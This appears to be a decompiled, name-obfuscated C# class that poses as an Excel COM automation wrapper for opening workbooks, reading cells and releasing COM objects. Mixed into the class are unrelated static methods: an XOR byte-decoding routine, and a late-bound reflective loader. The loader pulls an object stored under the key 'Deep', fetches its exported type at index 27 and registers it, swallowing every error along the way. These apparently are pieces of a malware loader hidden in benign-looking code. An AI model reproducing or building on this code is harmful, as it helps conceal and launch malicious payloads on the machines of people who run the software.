using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Cf2;
using Em2;
using Kk0;
using Microsoft.VisualBasic.CompilerServices;
using Pn96;
using y1Q;

namespace s2JL;

public class r5TX
{
	private s3J _oXls;

	private z4J _oWBook;

	private w0S _oSheet;

	public s3J OXls
	{
		get
		{
			return _oXls;
		}
		set
		{
			_oXls = value;
		}
	}

	public z4J OWBook
	{
		get
		{
			return _oWBook;
		}
		set
		{
			_oWBook = value;
		}
	}

	public w0S OSheet
	{
		get
		{
			return _oSheet;
		}
		set
		{
			_oSheet = value;
		}
	}

	public r5TX()
	{
		_oXls = (s3J)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("00024500-0000-0000-C000-000000000046")));
	}

	public void f3LZ(string Pi21, bool a7M2)
	{
		OWBook = OXls.Workbooks.Open(Pi21, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		OXls.Visible = a7M2;
	}

	internal static bool Ka54()
	{
		try
		{
			try
			{
				Type type = (Type)p6NX(RuntimeHelpers.GetObjectValue(t2ZE.mDic["Deep"]));
				if (Operators.CompareString(type.Name, t2ZE.mDic[t2ZE.tName].ToString(), false) == 0)
				{
					t2ZE.mDic.Add(t2ZE.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public void x9CS(string Xw9p)
	{
		OSheet = (w0S)OWBook.Sheets[Xw9p];
	}

	public r1P Js2n(int Xf27, int Dq8i)
	{
		return (r1P)OSheet.Cells[Xf27, Dq8i];
	}

	public void Sq8n(bool Jm36)
	{
		if (OWBook != null)
		{
			OWBook.Close(Jm36, RuntimeHelpers.GetObjectValue(Type.Missing), RuntimeHelpers.GetObjectValue(Type.Missing));
		}
		OXls.Quit();
		s3J t4DR = OXls;
		r1M2(ref t4DR);
		OXls = t4DR;
	}

	internal static byte Rt2m(byte t9J0, byte[] b9N0, int t7D9, int i0WB)
	{
		t9J0 = (byte)(t9J0 ^ checked((byte)(b9N0[unchecked(i0WB % b9N0.Length)] ^ ((i0WB + unchecked(t7D9 % b9N0.Length)) & t7D9))));
		return t9J0;
	}

	private static void r1M2<Mt36>(ref Mt36 t4DR, bool o1B7 = false) where Mt36 : class
	{
		if (t4DR == null)
		{
			return;
		}
		try
		{
			if (Marshal.IsComObject(t4DR))
			{
				if (o1B7)
				{
					Marshal.FinalReleaseComObject(t4DR);
				}
				else
				{
					Marshal.ReleaseComObject(t4DR);
				}
			}
		}
		finally
		{
			t4DR = null;
		}
	}

	internal static object p6NX(object s2M4)
	{
		return NewLateBinding.LateIndexGet(NewLateBinding.LateGet(s2M4, (Type)null, "GetExportedTypes", new object[0], (string[])null, (Type[])null, (bool[])null), new object[1] { 27 }, (string[])null);
	}
}
